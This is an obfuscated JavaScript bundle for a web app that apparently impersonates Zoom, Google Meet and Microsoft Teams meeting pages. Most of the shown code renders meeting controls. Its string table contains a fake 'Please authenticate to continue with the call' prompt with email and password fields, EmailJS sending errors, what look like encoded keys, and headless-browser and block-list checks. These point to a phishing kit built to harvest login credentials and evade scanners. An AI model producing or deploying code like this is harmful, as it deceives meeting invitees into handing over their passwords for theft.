const a1_0x15a3f4 = a1_0x29d2;
(function(_0x2c0bc5, _0x4beeca) {
    const _0x2bfc77 = a1_0x29d2,
        _0x4bf1a8 = _0x2c0bc5();
    while (!![]) {
        try {
            const _0x4b9223 = -parseInt(_0x2bfc77(0x120)) / 0x1 * (parseInt(_0x2bfc77(0xee)) / 0x2) + parseInt(_0x2bfc77(0x1a2)) / 0x3 * (-parseInt(_0x2bfc77(0x1dd)) / 0x4) + parseInt(_0x2bfc77(0x115)) / 0x5 + parseInt(_0x2bfc77(0x1ba)) / 0x6 * (parseInt(_0x2bfc77(0x1d5)) / 0x7) + parseInt(_0x2bfc77(0x176)) / 0x8 + parseInt(_0x2bfc77(0x110)) / 0x9 + -parseInt(_0x2bfc77(0x16e)) / 0xa * (parseInt(_0x2bfc77(0x11e)) / 0xb);
            if (_0x4b9223 === _0x4beeca) break;
            else _0x4bf1a8['push'](_0x4bf1a8['shift']());
        } catch (_0x1039ab) {
            _0x4bf1a8['push'](_0x4bf1a8['shift']());
        }
    }
}(a1_0x5577, 0xc6d20));
const __vite__mapDeps = (_0x11367b, _0x32729b = __vite__mapDeps, _0x1cafd8 = _0x32729b['f'] || (_0x32729b['f'] = [a1_0x15a3f4(0x1b2), 'assets/index-Cqb3OEgD.js', 'assets/index-lq1BA1lr.css', 'assets/ParticipantVideo-DDctf9yo.js', 'assets/AdminPanel-bTFTlE0J.js', 'assets/SpeakerView-DqzAdoqk.js'])) => _0x11367b['map'](_0x3722e3 => _0x1cafd8[_0x3722e3]);
import {
    u as a1_0x1b1157,
    r as a1_0x48812b,
    j as a1_0x494423,
    A as a1_0x2c6efc,
    m as a1_0x12cdf6,
    h as a1_0x54b148,
    i as a1_0x245277,
    _ as a1_0x45edaa
} from './index-Cqb3OEgD.js';
import {
    c as a1_0x4c166e,
    F as a1_0x4e933a,
    a as a1_0x38ba74,
    b as a1_0x56b169,
    d as a1_0x20304c,
    e as a1_0x417739,
    S as a1_0x3f67cd,
    f as a1_0x107778,
    G as a1_0x425cda,
    g as a1_0x461232,
    h as a1_0x363084,
    i as a1_0x199e92,
    j,
    k as a1_0x3adc10,
    l as a1_0x377e0f,
    m as a1_0x6ee25d,
    n as a1_0x599101,
    o as a1_0x4799ff,
    p as a1_0x32a400,
    q as a1_0x54c43b,
    r as a1_0x2c64be,
    s as a1_0x24269d,
    t as a1_0x30cf80,
    u as a1_0x1e0b58,
    v as a1_0x42a1d5,
    w as a1_0x28d0b3,
    x as a1_0x4f1a50,
    y as a1_0x9ce02d,
    A as a1_0x19b995
} from './AdminPanel-bTFTlE0J.js';
const A = () => {
    const _0x2e2a32 = a1_0x15a3f4,
        {
            state: _0x11fe32,
            dispatch: _0x8def35
        } = a1_0x1b1157(),
        [_0x516bf3, _0x21e531] = a1_0x48812b['useState'](!0x1),
        _0x3184b2 = ((() => {
            const _0x115394 = a1_0x29d2;
            switch (_0x11fe32['meetingPlatform']) {
                case _0x115394(0x1b1):
                    return {
                        'icon': a1_0x494423[_0x115394(0xf5)](a1_0x3f67cd, {
                            'className': _0x115394(0x165)
                        }),
                        'name': _0x115394(0x153),
                        'color': _0x115394(0x1b7),
                        'shortName': _0x115394(0x106)
                    };
                case _0x115394(0xf9):
                    return {
                        'icon': a1_0x494423['jsx'](a1_0x107778, {
                            'className': _0x115394(0x17e)
                        }),
                        'name': 'Google\x20Meet',
                        'color': _0x115394(0x18e),
                        'shortName': 'Meet'
                    };
                case 'teams':
                    return {
                        'icon': a1_0x494423['jsx']('img', {
                            'src': 'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c9/Microsoft_Office_Teams_%282018%E2%80%93present%29.svg/512px-Microsoft_Office_Teams_%282018%E2%80%93present%29.svg.png?20210603103011',
                            'alt': 'Teams',
                            'className': 'w-5\x20h-5'
                        }),
                        'name': 'Microsoft\x20Teams',
                        'color': 'text-purple-600',
                        'shortName': _0x115394(0x177)
                    };
                default:
                    return {
                        'icon': a1_0x494423['jsx'](a1_0x3f67cd, {
                            'className': 'text-blue-600\x20text-xl'
                        }),
                        'name': 'Video\x20Meeting',
                        'color': 'text-blue-600',
                        'shortName': 'Meeting'
                    };
            }
        })()),
        _0x245ed7 = _0x11fe32[_0x2e2a32(0x137)][_0x2e2a32(0x1aa)] + 0x1,
        _0x1fc683 = [{
            'icon': a1_0x38ba74,
            'label': 'Meeting\x20Info',
            'action': _0x2e2a32(0x16d),
            'mobileLabel': 'Info'
        }, {
            'icon': a1_0x56b169,
            'label': _0x2e2a32(0x1da),
            'action': 'security',
            'mobileLabel': 'Security'
        }, {
            'icon': a1_0x20304c,
            'label': _0x2e2a32(0x187) + _0x245ed7 + ')',
            'action': _0x2e2a32(0x137),
            'mobileLabel': _0x2e2a32(0x181) + _0x245ed7 + ')'
        }, {
            'icon': a1_0x417739,
            'label': 'Chat',
            'action': _0x2e2a32(0x199),
            'mobileLabel': 'Chat'
        }],
        _0x42e636 = _0x366f43 => {
            const _0x430932 = _0x2e2a32;
            _0x8def35({
                'type': _0x430932(0xf6),
                'payload': _0x366f43
            }), _0x21e531(!0x1);
        };
    return a1_0x494423['jsxs']('header', {
        'className': a1_0x4c166e(_0x2e2a32(0x13d), _0x11fe32['darkMode'] ? 'border-gray-700\x20bg-gray-800' : _0x2e2a32(0x19f)),
        'children': [a1_0x494423['jsxs'](_0x2e2a32(0x125), {
            'className': _0x2e2a32(0x178),
            'children': [a1_0x494423[_0x2e2a32(0x18c)]('div', {
                'className': 'flex\x20items-center\x20space-x-3\x20min-w-0\x20flex-1',
                'children': [a1_0x494423['jsx']('div', {
                    'className': _0x2e2a32(0x182),
                    'children': _0x3184b2['icon']
                }), a1_0x494423['jsxs']('div', {
                    'className': 'min-w-0\x20flex-1',
                    'children': [a1_0x494423[_0x2e2a32(0xf5)]('h1', {
                        'className': 'font-semibold\x20text-gray-900\x20dark:text-white\x20text-sm\x20sm:text-base\x20truncate\x20capitalize',
                        'children': _0x11fe32['meetingInfo']['title']
                    }), a1_0x494423['jsxs']('p', {
                        'className': 'text-xs\x20text-gray-500\x20dark:text-gray-400\x20truncate',
                        'children': [_0x3184b2['shortName'], _0x2e2a32(0x19c), _0x245ed7, '\x20people']
                    })]
                })]
            }), a1_0x494423[_0x2e2a32(0xf5)]('button', {
                'onClick': () => _0x21e531(!_0x516bf3),
                'className': 'sm:hidden\x20p-2\x20rounded-lg\x20ml-2\x20flex-shrink-0',
                'children': a1_0x494423[_0x2e2a32(0xf5)](a1_0x4e933a, {
                    'className': _0x2e2a32(0x11f)
                })
            })]
        }), a1_0x494423[_0x2e2a32(0x18c)](_0x2e2a32(0x125), {
            'className': a1_0x4c166e(_0x2e2a32(0x1c7), _0x2e2a32(0x15e), _0x11fe32['darkMode'] ? _0x2e2a32(0x1e7) : 'bg-gray-50\x20text-gray-700\x20border-gray-300'),
            'children': [a1_0x494423['jsx']('div', {
                'className': a1_0x4c166e('w-2\x20h-2\x20rounded-full\x20animate-pulse', _0x11fe32[_0x2e2a32(0x16b)] ? 'bg-red-500' : 'bg-green-500')
            }), a1_0x494423[_0x2e2a32(0xf5)]('span', {
                'className': 'hidden\x20lg:inline',
                'children': _0x11fe32['isMuted'] ? _0x2e2a32(0x15d) : _0x2e2a32(0x102)
            })]
        }), a1_0x494423[_0x2e2a32(0x18c)]('div', {
            'className': 'hidden\x20sm:flex\x20items-center\x20space-x-1',
            'children': [_0x1fc683['map']((_0x5ad366, _0x13c421) => a1_0x494423[_0x2e2a32(0x18c)](_0x2e2a32(0x10c), {
                'onClick': () => _0x42e636(_0x5ad366['action']),
                'className': a1_0x4c166e(_0x2e2a32(0x171), 'hover:shadow-sm', _0x11fe32['darkMode'] ? _0x2e2a32(0x101) : 'text-gray-600\x20hover:bg-gray-100', _0x11fe32['show' + (_0x5ad366[_0x2e2a32(0x17f)]['charAt'](0x0)[_0x2e2a32(0x12b)]() + _0x5ad366['action'][_0x2e2a32(0x151)](0x1)) + _0x2e2a32(0x19d)] && _0x2e2a32(0x145)),
                'children': [a1_0x494423[_0x2e2a32(0xf5)](_0x5ad366['icon'], {}), a1_0x494423['jsx']('span', {
                    'className': _0x2e2a32(0xed),
                    'children': _0x5ad366[_0x2e2a32(0x146)]
                })]
            }, _0x5ad366['action'])), a1_0x494423[_0x2e2a32(0xf5)]('button', {
                'className': a1_0x4c166e('p-2\x20rounded-lg\x20transition-colors', _0x11fe32[_0x2e2a32(0x1ed)] ? _0x2e2a32(0xfa) : _0x2e2a32(0x1ca)),
                'children': a1_0x494423[_0x2e2a32(0xf5)](a1_0x4e933a, {})
            })]
        }), _0x516bf3 && a1_0x494423['jsxs']('div', {
            'className': a1_0x4c166e(_0x2e2a32(0x1a8), _0x11fe32['darkMode'] ? 'bg-gray-800\x20border-gray-700' : _0x2e2a32(0x185)),
            'children': [a1_0x494423[_0x2e2a32(0xf5)]('div', {
                'className': a1_0x4c166e(_0x2e2a32(0x147), _0x11fe32['darkMode'] ? _0x2e2a32(0x1e4) : _0x2e2a32(0x1ea)),
                'children': a1_0x494423[_0x2e2a32(0x18c)]('div', {
                    'className': a1_0x4c166e('px-3\x20py-1\x20rounded-full\x20text-sm\x20font-medium\x20flex\x20items-center\x20space-x-2', _0x11fe32[_0x2e2a32(0x1ed)] ? _0x2e2a32(0x10f) : 'bg-gray-100\x20text-gray-700'),
                    'children': [a1_0x494423['jsx'](_0x2e2a32(0x125), {
                        'className': a1_0x4c166e('w-2\x20h-2\x20rounded-full\x20animate-pulse', _0x11fe32[_0x2e2a32(0x16b)] ? 'bg-red-500' : 'bg-green-500')
                    }), a1_0x494423['jsx']('span', {
                        'children': _0x11fe32[_0x2e2a32(0x16b)] ? 'Muted' : _0x2e2a32(0x102)
                    })]
                })
            }), _0x1fc683[_0x2e2a32(0x122)](_0x209557 => a1_0x494423[_0x2e2a32(0x18c)]('button', {
                'onClick': () => _0x42e636(_0x209557['action']),
                'className': a1_0x4c166e(_0x2e2a32(0x144), _0x11fe32['darkMode'] ? 'border-gray-700\x20hover:bg-gray-700\x20text-gray-300' : 'border-gray-200\x20hover:bg-gray-50\x20text-gray-700', _0x11fe32[_0x2e2a32(0x1b4) + (_0x209557[_0x2e2a32(0x17f)][_0x2e2a32(0x1a5)](0x0)['toUpperCase']() + _0x209557['action']['slice'](0x1)) + _0x2e2a32(0x19d)] && 'bg-blue-100\x20dark:bg-blue-900\x20text-blue-600\x20dark:text-blue-300'),
                'children': [a1_0x494423[_0x2e2a32(0xf5)](_0x209557[_0x2e2a32(0x149)], {}), a1_0x494423['jsx'](_0x2e2a32(0xfe), {
                    'children': _0x209557['mobileLabel']
                })]
            }, _0x209557[_0x2e2a32(0x17f)]))]
        })]
    });
};

function a1_0x29d2(_0x52f849, _0x426a8c) {
    const _0x5577a9 = a1_0x5577();
    return a1_0x29d2 = function(_0x29d212, _0x15e2a5) {
        _0x29d212 = _0x29d212 - 0xea;
        let _0x339ee0 = _0x5577a9[_0x29d212];
        return _0x339ee0;
    }, a1_0x29d2(_0x52f849, _0x426a8c);
}

function R(_0x44c7a2) {
    const _0x472dcb = a1_0x15a3f4;
    return a1_0x425cda({
        'attr': {
            'viewBox': _0x472dcb(0x148)
        },
        'child': [{
            'tag': _0x472dcb(0x1ec),
            'attr': {
                'fill': 'none',
                'd': 'M0\x200h24v24H0z'
            },
            'child': []
        }, {
            'tag': 'path',
            'attr': {
                'd': _0x472dcb(0x1eb)
            },
            'child': []
        }]
    })(_0x44c7a2);
}

function z(_0x556f35) {
    const _0x315944 = a1_0x15a3f4;
    return a1_0x425cda({
        'attr': {
            'viewBox': _0x315944(0x148)
        },
        'child': [{
            'tag': _0x315944(0x1ec),
            'attr': {
                'fill': 'none',
                'd': 'M0\x200h24v24H0z'
            },
            'child': []
        }, {
            'tag': 'path',
            'attr': {
                'd': _0x315944(0x150)
            },
            'child': []
        }]
    })(_0x556f35);
}

function a1_0x5577() {
    const _0x19c94f = ['flex\x20items-center\x20space-x-2\x20px-3\x20py-2\x20rounded-lg\x20text-sm\x20font-medium\x20transition-colors', 'TOGGLE_MUTE', 'Please\x20authenticate\x20to\x20continue\x20with\x20the\x20call', 'animate-spin', 'isHost', '6582352POlmxs', 'Teams', 'flex\x20items-center\x20justify-between\x20w-full\x20sm:w-auto', 'footer', 'bg-red-500', 'inline\x20mr-1', 'flex-1\x20transition-all\x20duration-300', 'borderColor', 'text-green-600\x20text-xl', 'action', 'bg-blue-500\x20hover:bg-blue-600', 'People\x20(', 'flex\x20items-center\x20justify-center\x20w-8\x20h-8\x20rounded-lg\x20bg-gray-100\x20dark:bg-gray-700\x20flex-shrink-0', 'Join\x20Meeting', 'Require\x20Authentication', 'bg-white\x20border-gray-200', 'hover:shadow-lg\x20transform\x20hover:scale-105\x20active:scale-95', 'Participants\x20(', 'font-semibold', 'You', 'text-blue-600\x20text-5xl', 'The\x20BlockList\x20list\x20has\x20to\x20be\x20an\x20array', 'jsxs', 'blockHeadless', 'text-green-600', 'join', 'Forbidden', '[object\x20Object]', 'md:hidden', 'text-gray-600\x20dark:text-gray-400\x20text-sm', 'bg-green-500\x20hover:bg-green-600', 'includes', 'translate-x-full', 'border-gray-700\x20bg-gray-800', 'img', 'chat', 'flex\x20flex-col\x20items-center\x20space-y-6', 'sticky\x20bottom-0\x20z-30', '\x20•\x20', 'Panel', 'text-gray-600', 'border-gray-200\x20bg-white', 'TOGGLE_RECORDING', 'Enter\x20your\x20password', '12hfCyOK', 'meetingInfo', 'font-medium', 'charAt', 'input', 'p-4\x20rounded-2xl\x20bg-white\x20dark:bg-gray-800\x20shadow-lg\x20border', 'sm:hidden\x20absolute\x20top-full\x20left-0\x20right-0\x20z-50\x20mt-1\x20rounded-lg\x20border\x20shadow-lg', 'Email\x20Address', 'length', 'Mute', 'bg-gray-100\x20dark:bg-gray-700\x20text-gray-500\x20dark:text-gray-400', 'value', 'Microsoft\x20Teams', 'Host:\x20', 'bg-gray-700\x20text-gray-400', 'zoom', 'assets/VideoGrid-CUyw7B4_.js', 'role', 'show', 'onClick', 'bg-red-500\x20text-white\x20hover:bg-red-600', 'text-blue-600', 'set', 'split', '26262UbBKXg', 'fixed\x20inset-0\x20bg-black/60\x20backdrop-blur-sm\x20bg-opacity-75\x20flex\x20items-center\x20justify-center\x20p-4\x20z-50', 'text', 'text-sm\x20text-gray-600\x20dark:text-gray-400\x20flex\x20items-center\x20space-x-2', 'email', 'rounded-2xl\x20p-6\x20w-full\x20max-w-md\x20mx-auto', 'disabled:opacity-50\x20disabled:cursor-not-allowed', 'undefined', 'p-4', 'trim', 'Screen\x20sharing\x20failed\x20or\x20was\x20cancelled.', 'w-12\x20h-6\x20bg-blue-500\x20rounded-full\x20relative', 'bg-red-600\x20text-white\x20hover:bg-red-700', 'hidden\x20sm:flex\x20items-center\x20space-x-2\x20flex-shrink-0', 'from-[#5059C9]\x20to-[#5059C9]', 'toString', 'hover:bg-gray-100\x20text-gray-600', 'throttle', 'text-xs\x20font-medium', 'isAdmin', 'mediaDevices', 'Participants', 'bg-gray-50\x20dark:bg-gray-800\x20rounded-lg\x20p-4\x20h-96\x20flex\x20items-center\x20justify-center', 'getTracks', '\x20are\x20expected\x20to\x20join', 'text-left', 'catch', '1939BbBqmC', 'reject', 'w-2\x20h-2\x20rounded-full', 'isVideoOn', 'block\x20text-sm\x20font-medium\x20mb-2\x20text-gray-700\x20dark:text-gray-300', 'Security', 'invalid\x20email\x20and\x20password\x20provided', 'TOGGLE_VIEW_MODE', '278480Cuqrmz', 'flex\x20items-center\x20justify-center\x20h-full', 'animate-spin\x20rounded-full\x20h-12\x20w-12\x20border-b-2\x20border-blue-500', 'w-full\x20pl-10\x20pr-12\x20py-3\x20rounded-lg\x20border\x20text-sm', 'avatar', 'languages', 'font-medium\x20text-gray-900\x20dark:text-white', 'border-gray-700', 'QTZUNEV4NUk2MHM4SkRVZDc=', 'text-center\x20text-gray-500\x20dark:text-gray-400', 'bg-gray-700\x20text-gray-300\x20border-gray-600', 'text-center\x20text-xs\x20text-gray-500\x20dark:text-gray-400', 'text-gray-600\x20text-5xl', 'border-gray-200', 'M17\x2010.5V7c0-.55-.45-1-1-1H4c-.55\x200-1\x20.45-1\x201v10c0\x20.55.45\x201\x201\x201h12c.55\x200\x201-.45\x201-1v-3.5l4\x204v-11l-4\x204z', 'path', 'darkMode', 'flex\x20items-center\x20justify-center\x20space-x-4\x20mb-4', 'active', 'w-3\x20h-3\x20rounded-full\x20animate-bounce', 'hidden\x20lg:inline', '844MMawdC', 'border-gray-300\x20dark:border-gray-600\x20cursor-not-allowed', 'bg-gray-500\x20hover:bg-gray-600', 'Cannot\x20access\x20camera.\x20Please\x20check\x20your\x20camera\x20permissions\x20and\x20try\x20again.', 'The\x20template\x20ID\x20is\x20required.\x20Visit\x20https://dashboard.emailjs.com/admin/templates', 'w-full\x20pl-10\x20pr-4\x20py-3\x20rounded-lg\x20border\x20text-sm', 'hover:shadow-md\x20active:scale-95', 'jsx', 'TOGGLE_PANEL', 'Preparing\x20your\x20meeting\x20experience...', 'Google\x20Meet', 'meet', 'hover:bg-gray-700\x20text-gray-300', 'Security\x20Settings', 'useEffect', 'bg-blue-50\x20dark:bg-blue-900/20', 'span', 'Leave', 'gradient', 'text-gray-300\x20hover:bg-gray-700', 'Unmuted', 'w-12\x20h-12', 'Video\x20Meeting', 'flex\x20items-center\x20space-x-3\x20text-sm\x20text-gray-600\x20dark:text-gray-400\x20bg-gray-50\x20dark:bg-gray-700\x20rounded-lg\x20p-3', 'Zoom', 'duration', 'w-4\x20h-4\x20border-2\x20border-white\x20border-t-transparent\x20rounded-full\x20animate-spin', 'then', 'text-gray-400', 'bg-gray-800\x20border-gray-700', 'button', 'flex-1', 'text-amber-500', 'bg-gray-700\x20text-gray-300', '2528298gYTNzt', 'Record', 'eHRuZ04wejkxa25hemRRSzM=', 'forEach', 'video', '4617755hRRFAI', 'watchVariable', 'Are\x20you\x20sure\x20you\x20want\x20to\x20leave\x20the\x20meeting?', 'from-gray-500\x20to-gray-600', 'flex\x20items-center\x20space-x-2\x20p-3\x20rounded-lg\x20text-sm', '/meet.svg', 'title', '0\x200\x2020\x2020', 'getUserMedia', '11198CZRJHP', 'text-gray-600\x20dark:text-gray-400', '2441WUvAgO', 'Stop\x20Recording', 'map', 'The\x20public\x20key\x20is\x20required.\x20Visit\x20https://dashboard.emailjs.com/admin/account', 'lazy', 'div', 'toLowerCase', 'spring', 'p-2\x20sm:p-4\x20h-full', 'flex-shrink-0', 'isArray', 'toUpperCase', 'preventDefault', 'string', 'buttonColor', 'resolve', 'Poll', 'showAuthModal', 'grid', 'useState', 'text-2xl\x20font-bold\x20text-gray-900\x20dark:text-white\x20mb-2', 'now', 'font-medium\x20text-gray-900\x20dark:text-white\x20capitalize', 'participants', 'Chat', 'showSecurityPanel', 'list', 'text-2xl', 'The\x20template\x20params\x20have\x20to\x20be\x20the\x20object.\x20Visit\x20https://www.emailjs.com/docs/sdk/send/', 'flex\x20flex-col\x20sm:flex-row\x20sm:justify-between\x20sm:items-center\x20px-4\x20py-3\x20border-b\x20relative', 'flex\x20justify-between\x20items-center\x20overflow-x-auto\x20space-x-1', 'status', 'getItem', 'stringify', 'text-sm\x20text-blue-700\x20dark:text-blue-300', 'hover:bg-gray-200\x20text-gray-700', 'w-full\x20flex\x20items-center\x20space-x-3\x20px-4\x20py-3\x20text-left\x20border-b\x20transition-colors', 'bg-blue-100\x20dark:bg-blue-900\x20text-blue-600\x20dark:text-blue-300', 'label', 'flex\x20items-center\x20justify-center\x20p-3\x20border-b', '0\x200\x2024\x2024', 'icon', './SpeakerView-DqzAdoqk.js', 'border-gray-200\x20dark:border-gray-800', 'translate-x-0', 'bg-white/90\x20dark:bg-gray-800/90\x20backdrop-blur-sm', 'SHOW_AUTH_MODAL', 'currentUser', 'M12\x201\x203\x205v6c0\x205.55\x203.84\x2010.74\x209\x2012\x205.16-1.26\x209-6.45\x209-12V5l-9-4z', 'slice', 'blockList', 'Zoom\x20Meeting', 'w-12\x20h-6\x20bg-gray-300\x20rounded-full\x20relative', 'country', 'text-base\x20mb-1', 'w-12\x20h-12\x20rounded-full\x20bg-gradient-to-br\x20from-blue-500\x20to-blue-600\x20flex\x20items-center\x20justify-center\x20text-white\x20font-semibold\x20text-sm\x20border-2\x20border-white\x20shadow-sm', 'w-12\x20h-12\x20rounded-full\x20object-cover\x20border-2\x20border-white\x20shadow-sm', 'text-center\x20p-4\x20bg-yellow-50\x20dark:bg-yellow-900/20\x20rounded-lg\x20border\x20border-yellow-200\x20dark:border-yellow-800', 'p-1\x20hover:bg-gray-200\x20dark:hover:bg-gray-700\x20rounded', 'fixed\x20inset-0\x20bg-gradient-to-br\x20from-gray-50\x20to-gray-100\x20dark:from-gray-900\x20dark:to-gray-800\x20flex\x20items-center\x20justify-center\x20z-50\x20p-4', 'name', 'Muted', 'px-3\x20py-1\x20rounded-full\x20text-sm\x20font-medium\x20border', 'M13\x206a3\x203\x200\x2011-6\x200\x203\x203\x200\x20016\x200zM18\x208a2\x202\x200\x2011-4\x200\x202\x202\x200\x20014\x200zM14\x2015a4\x204\x200\x2000-8\x200v3h8v-3zM6\x208a2\x202\x200\x2011-4\x200\x202\x202\x200\x20014\x200zM16\x2018v-3a5.972\x205.972\x200\x2000-.75-2.906A3.005\x203.005\x200\x200119\x2015v3h-3zM4.75\x2012.094A5.973\x205.973\x200\x20004\x2015v3H1v-3a3\x203\x200\x20013.75-2.906z', 'storageProvider', 'TOGGLE_SCREEN_SHARE', 'TOGGLE_VIDEO', 'isLoading', 'relative', 'text-blue-600\x20text-xl', 'text-gray-400\x20hover:text-gray-600', 'text-blue-400', 'isScreenSharing', 'application/json', 'truncate', 'isMuted', 'showChatPanel', 'info', '10970CPGcsu', 'bg-blue-900/30', 'mt-4\x20p-3\x20rounded-lg\x20text-xs\x20text-center'];
    a1_0x5577 = function() {
        return _0x19c94f;
    };
    return a1_0x5577();
}

function U(_0x5b640e) {
    const _0x319a3b = a1_0x15a3f4;
    return a1_0x425cda({
        'attr': {
            'viewBox': _0x319a3b(0x11c),
            'fill': 'currentColor',
            'aria-hidden': 'true'
        },
        'child': [{
            'tag': _0x319a3b(0x1ec),
            'attr': {
                'd': _0x319a3b(0x15f)
            },
            'child': []
        }]
    })(_0x5b640e);
}
const D = () => {
    const _0x47afff = a1_0x15a3f4,
        {
            state: _0x44e346,
            dispatch: _0x2134ff
        } = a1_0x1b1157(),
        _0x149cab = [{
            'icon': _0x44e346[_0x47afff(0x16b)] ? a1_0x461232 : a1_0x363084,
            'label': _0x44e346['isMuted'] ? 'Unmute' : _0x47afff(0x1ab),
            'onClick': () => {
                _0x2134ff({
                    'type': 'TOGGLE_MUTE'
                });
            },
            'active': _0x44e346['isMuted'],
            'mobileLabel': _0x44e346['isMuted'] ? 'Unmute' : 'Mute'
        }, {
            'icon': _0x44e346[_0x47afff(0x1d8)] ? a1_0x199e92 : j,
            'label': _0x44e346['isVideoOn'] ? 'Stop\x20Video' : 'Start\x20Video',
            'onClick': async() => {
                const _0x3e58e6 = _0x47afff;
                if (_0x44e346['isVideoOn']) _0x2134ff({
                    'type': 'TOGGLE_VIDEO'
                });
                else try {
                    (await navigator['mediaDevices']['getUserMedia']({
                        'video': !0x0
                    }))[_0x3e58e6(0x1d1)]()['forEach'](_0x1013c5 => _0x1013c5['stop']()), _0x2134ff({
                        'type': _0x3e58e6(0x162)
                    });
                } catch (_0x3dcf13) {
                    return void alert(_0x3e58e6(0xf1));
                }
            },
            'active': !_0x44e346[_0x47afff(0x1d8)],
            'mobileLabel': 'Video'
        }, {
            'icon': a1_0x3adc10,
            'label': _0x44e346[_0x47afff(0x168)] ? 'Stop\x20Share' : 'Share\x20Screen',
            'onClick': () => {
                const _0x45ad83 = _0x47afff;
                _0x44e346['isScreenSharing'] ? _0x2134ff({
                    'type': _0x45ad83(0x161)
                }) : navigator['mediaDevices'] && navigator[_0x45ad83(0x1ce)]['getDisplayMedia'] ? navigator['mediaDevices']['getDisplayMedia']({
                    'video': !0x0
                })['then'](_0x2d1092 => {
                    _0x2134ff({
                        'type': 'TOGGLE_SCREEN_SHARE'
                    });
                })[_0x45ad83(0x1d4)](_0x3ad066 => {
                    const _0x384f9d = _0x45ad83;
                    alert(_0x384f9d(0x1c4));
                }) : alert('Screen\x20sharing\x20is\x20not\x20supported\x20in\x20your\x20browser.');
            },
            'active': _0x44e346['isScreenSharing'],
            'mobileLabel': 'Share'
        }, {
            'icon': a1_0x377e0f,
            'label': _0x44e346['isRecording'] ? _0x47afff(0x121) : 'Record',
            'onClick': () => {
                const _0x3f803e = _0x47afff;
                _0x2134ff({
                    'type': _0x3f803e(0x1a0)
                });
            },
            'active': _0x44e346['isRecording'],
            'mobileLabel': _0x47afff(0x111)
        }, {
            'icon': U,
            'label': _0x47afff(0x1cf),
            'onClick': () => _0x2134ff({
                'type': 'TOGGLE_PANEL',
                'payload': 'participants'
            }),
            'mobileLabel': 'People'
        }, {
            'icon': a1_0x417739,
            'label': _0x47afff(0x138),
            'onClick': () => _0x2134ff({
                'type': 'TOGGLE_PANEL',
                'payload': 'chat'
            }),
            'mobileLabel': 'Chat'
        }, {
            'icon': z,
            'label': _0x47afff(0x1da),
            'onClick': () => _0x2134ff({
                'type': _0x47afff(0xf6),
                'payload': 'security'
            }),
            'mobileLabel': 'Security'
        }, {
            'icon': a1_0x6ee25d,
            'label': 'Polling',
            'onClick': () => alert('Polling\x20feature\x20would\x20open\x20here'),
            'mobileLabel': _0x47afff(0x130)
        }, {
            'icon': 'grid' === _0x44e346['viewMode'] ? R : a1_0x599101,
            'label': 'grid' === _0x44e346['viewMode'] ? 'Speaker\x20View' : 'Grid\x20View',
            'onClick': () => {
                const _0x656aa0 = _0x47afff;
                _0x2134ff({
                    'type': _0x656aa0(0x1dc)
                });
            },
            'mobileLabel': 'View'
        }, {
            'icon': a1_0x4799ff,
            'label': _0x47afff(0xff),
            'onClick': () => {
                const _0x1abb83 = _0x47afff;
                confirm(_0x1abb83(0x117)) && _0x2134ff({
                    'type': _0x1abb83(0x14e),
                    'payload': !0x0
                });
            },
            'danger': !0x0,
            'mobileLabel': 'Leave'
        }];
    return a1_0x494423[_0x47afff(0x18c)](_0x47afff(0x179), {
        'className': a1_0x4c166e('py-2\x20px-4\x20border-t', _0x44e346['darkMode'] ? _0x47afff(0x197) : 'border-gray-300\x20bg-white', _0x47afff(0x19b)),
        'children': [a1_0x494423['jsx']('div', {
            'className': 'hidden\x20md:flex\x20justify-center\x20items-center\x20space-x-2',
            'children': _0x149cab['map']((_0x38d19c, _0x43c0df) => a1_0x494423['jsxs']('button', {
                'onClick': _0x38d19c['onClick'],
                'className': a1_0x4c166e('flex\x20flex-col\x20items-center\x20p-2\x20rounded-lg\x20transition-all\x20duration-200\x20min-w-16', 'hover:shadow-md\x20active:scale-95', _0x44e346['darkMode'] ? _0x47afff(0xfa) : 'hover:bg-gray-200\x20text-gray-700', _0x38d19c['active'] && 'bg-red-500\x20text-white\x20hover:bg-red-600', _0x38d19c['danger'] && _0x47afff(0x1c6), 'flex-shrink-0'),
                'children': [a1_0x494423['jsx'](_0x38d19c['icon'], {
                    'className': 'text-lg\x20mb-1'
                }), a1_0x494423['jsx'](_0x47afff(0xfe), {
                    'className': 'text-xs\x20font-medium',
                    'children': _0x38d19c['label']
                })]
            }, _0x43c0df))
        }), a1_0x494423['jsxs']('div', {
            'className': _0x47afff(0x192),
            'children': [a1_0x494423[_0x47afff(0xf5)]('div', {
                'className': 'flex\x20justify-between\x20items-center\x20overflow-x-auto\x20pb-2\x20space-x-1',
                'children': _0x149cab['slice'](0x0, 0x5)[_0x47afff(0x122)]((_0x5e2682, _0x558887) => a1_0x494423['jsxs']('button', {
                    'onClick': _0x5e2682['onClick'],
                    'className': a1_0x4c166e('flex\x20flex-col\x20items-center\x20p-2\x20rounded-lg\x20transition-all\x20duration-200\x20min-w-12\x20flex-1', _0x47afff(0xf4), _0x44e346['darkMode'] ? 'hover:bg-gray-700\x20text-gray-300' : 'hover:bg-gray-200\x20text-gray-700', _0x5e2682['active'] && 'bg-red-500\x20text-white\x20hover:bg-red-600', _0x47afff(0x129)),
                    'children': [a1_0x494423[_0x47afff(0xf5)](_0x5e2682[_0x47afff(0x149)], {
                        'className': _0x47afff(0x156)
                    }), a1_0x494423['jsx'](_0x47afff(0xfe), {
                        'className': 'text-xs\x20font-medium',
                        'children': _0x5e2682['mobileLabel']
                    })]
                }, _0x558887))
            }), a1_0x494423[_0x47afff(0xf5)](_0x47afff(0x125), {
                'className': _0x47afff(0x13e),
                'children': _0x149cab['slice'](0x5)[_0x47afff(0x122)]((_0x5dcef1, _0x558119) => a1_0x494423['jsxs']('button', {
                    'onClick': _0x5dcef1[_0x47afff(0x1b5)],
                    'className': a1_0x4c166e('flex\x20flex-col\x20items-center\x20p-2\x20rounded-lg\x20transition-all\x20duration-200\x20min-w-12\x20flex-1', _0x47afff(0xf4), _0x44e346[_0x47afff(0x1ed)] ? _0x47afff(0xfa) : _0x47afff(0x143), _0x5dcef1['active'] && _0x47afff(0x1b6), _0x5dcef1['danger'] && _0x47afff(0x1c6), _0x47afff(0x129)),
                    'children': [a1_0x494423['jsx'](_0x5dcef1['icon'], {
                        'className': _0x47afff(0x156)
                    }), a1_0x494423[_0x47afff(0xf5)]('span', {
                        'className': _0x47afff(0x1cc),
                        'children': _0x5dcef1['mobileLabel']
                    })]
                }, _0x558119 + 0x5))
            })]
        })]
    });
};
class H {
    constructor(_0x3dbe6a = 0x0, _0x20697a = 'Network\x20Error') {
        const _0x5b03bc = a1_0x15a3f4;
